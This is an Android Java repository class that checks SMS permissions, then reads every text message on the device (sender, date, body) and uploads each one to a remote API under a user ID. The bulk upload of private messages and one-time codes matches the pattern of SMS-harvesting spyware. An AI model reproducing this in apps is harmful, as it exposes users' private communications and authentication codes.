package com.example.javaapp.repository;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import androidx.core.content.ContextCompat;
import com.example.javaapp.api.ApiClient;
import com.example.javaapp.api.ApiInterface;
import com.example.javaapp.models.SmsModel;
import com.example.javaapp.models.SmsResponseModel;
import com.example.javaapp.utils.AppUtil;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SmsRepository {
    private final Context context;
    private final ApiInterface apiInterface;

    public SmsRepository(Context context) {
        this.context = context;
        this.apiInterface = ApiClient.getClient(context).create(ApiInterface.class);
    }

    public interface SmsOperationCallback {
        void onSuccess();
        void onError(String error);
    }

    public boolean hasSmsPermissions() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    public void readAllSms(String userId, SmsOperationCallback callback) {
        if (!hasSmsPermissions() || userId.isEmpty()) {
            if (callback != null) {
                callback.onError("Missing permissions or user ID");
            }
            return;
        }

        new Thread(() -> {
            Uri smsUri = Telephony.Sms.CONTENT_URI;
            String[] projection = {
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.DATE,
                    Telephony.Sms.BODY,
                    Telephony.Sms.TYPE
            };

            try (Cursor cursor = context.getContentResolver().query(
                    smsUri, projection, null, null, Telephony.Sms.DATE + " DESC")) {

                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        SmsModel sms = extractSmsFromCursor(cursor, userId);
                        sendSmsToApi(sms, callback);
                    } while (cursor.moveToNext());

                    if (callback != null) {
                        callback.onSuccess();
                    }
                }
            } catch (Exception e) {
                if (callback != null) {
                    callback.onError(e.getMessage());
                }
            }
        }).start();
    }

    @SuppressLint("Range")
    private SmsModel extractSmsFromCursor(Cursor cursor, String userId) {
        String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
        String date = cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
        String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
        String type = cursor.getString(cursor.getColumnIndex(Telephony.Sms.TYPE));

        return new SmsModel(userId, body, AppUtil.stringToLocalDate(date), address);
    }

    private void sendSmsToApi(SmsModel sms, SmsOperationCallback callback) {
        Call<SmsResponseModel> call = apiInterface.createSms(sms);
        call.enqueue(new Callback<SmsResponseModel>() {
            @Override
            public void onResponse(Call<SmsResponseModel> call, Response<SmsResponseModel> response) {
                System.out.println("Response " + response.message());
            }

            @Override
            public void onFailure(Call<SmsResponseModel> call, Throwable t) {
                System.out.println("Error " + t.getMessage());
                if (callback != null) {
                    callback.onError(t.getMessage());
                }
            }
        });
    }
}